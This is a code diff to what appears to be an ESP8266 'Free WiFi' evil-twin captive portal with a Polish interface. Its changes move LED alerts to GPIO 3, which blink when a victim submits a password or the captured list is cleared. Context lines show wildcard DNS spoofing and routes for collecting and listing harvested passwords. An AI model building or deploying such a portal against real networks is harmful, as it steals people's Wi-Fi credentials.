@@ -19,6 +19,7 @@ const char* SSID_NAME = "Free WiFi";
 #define CLEAR_TITLE "Wyczyszczone"
 
 // Init system settings
+const byte led_gpio = 3; // LED connected to output 3
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
@@ -119,12 +120,22 @@ String clear() {
   return header(CLEAR_TITLE) + "<div><p>Lista hasel zostala wyczyszczona.</div></p><center><a style=\"color:blue\" href=/pass>Powrot do Pass</a></center>" + footer();
 }
 
-void BLINK()
-{ // The built-in LED will blink 5 times after a password is posted.
+void LEDON()
+{ // After entering the password, the diode connected to output no. 3 will flash for 5 seconds and then be on continuously.
   for (int counter = 0; counter < 10; counter++)
   {
     // For blinking the LED.
-    digitalWrite(BUILTIN_LED, counter % 2);
+    digitalWrite(led_gpio, counter % 2);
+    delay(500);
+  }
+}
+
+void LEDOFF()
+{ // After clearing the password, the diode connected to output no. 3 will flash for 5 seconds and then turn off.
+  for (int counter = 0; counter < 11; counter++)
+  {
+    // For blinking the LED.
+    digitalWrite(led_gpio, counter % 2);
     delay(500);
   }
 }
@@ -185,17 +196,20 @@ void setup()
 
   // Start webserver
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
-  webServer.on("/post", []() { webServer.send(200, "text/html", posted()); BLINK(); });
+  webServer.on("/post", []() { webServer.send(200, "text/html", posted()); LEDON(); });
   webServer.on("/ssid", []() { webServer.send(200, "text/html", ssid()); });
   webServer.on("/postSSID", []() { webServer.send(200, "text/html", postedSSID()); });
   webServer.on("/pass", []() { webServer.send(200, "text/html", pass()); });
-  webServer.on("/clear", []() { webServer.send(200, "text/html", clear()); });
+  webServer.on("/clear", []() { webServer.send(200, "text/html", clear()); LEDOFF(); });
   webServer.onNotFound([]() { lastActivity = millis(); webServer.send(200, "text/html", index()); });
   webServer.begin();
 
-  // Enable the built-in LED
-  pinMode(LED_BUILTIN, OUTPUT);
-  digitalWrite(LED_BUILTIN, HIGH);
+  // Turn on the LED and turn off the LED after 1 second
+  pinMode(led_gpio, OUTPUT);
+  digitalWrite(led_gpio, HIGH);
+  delay(1000);
+  digitalWrite(led_gpio, LOW);
+  delay(1000);
 }
 
 void loop()
